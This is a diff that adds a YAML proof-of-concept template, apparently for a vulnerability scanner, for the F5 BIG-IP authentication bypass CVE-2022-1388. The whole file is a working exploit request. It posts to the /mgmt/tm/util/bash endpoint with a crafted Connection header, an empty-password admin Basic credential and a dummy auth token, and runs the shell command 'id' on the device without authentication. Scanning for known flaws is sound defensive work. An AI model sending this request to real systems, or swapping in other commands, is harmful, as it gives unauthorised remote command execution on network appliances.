@@ -1,0 +1,27 @@
+detail:
+  author: luckying
+  links:
+  - https://support.f5.com/csp/article/K23605346
+  version: 16.1.0 < BIG-IP < 16.1.2| 15.1.0 < BIG-IP < 15.1.5| 14.1.0 < BIG-IP < 14.1.4|
+    13.1.0 < BIG-IP < 13.1.4| 12.1.0 < BIG-IP < 12.1.6| 11.6.1 < BIG-IP < 11.6.5
+expression: r0()
+manual: true
+name: poc-yaml-F5-BIG-IP-login-bypass-CVE-2022-1388
+rules:
+  r0:
+    expression: 'response.status==200
+
+      '
+    request:
+      body: '{"command": "run","utilCmdArgs": "-c id"}'
+      follow_redirects: true
+      headers:
+        Authorization: Basic YWRtaW46
+        Connection: keep-alive, X-F5-Auth-Token
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+          like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        X-F5-Auth-Token: a
+      method: POST
+      path: /mgmt/tm/util/bash
+transport: http
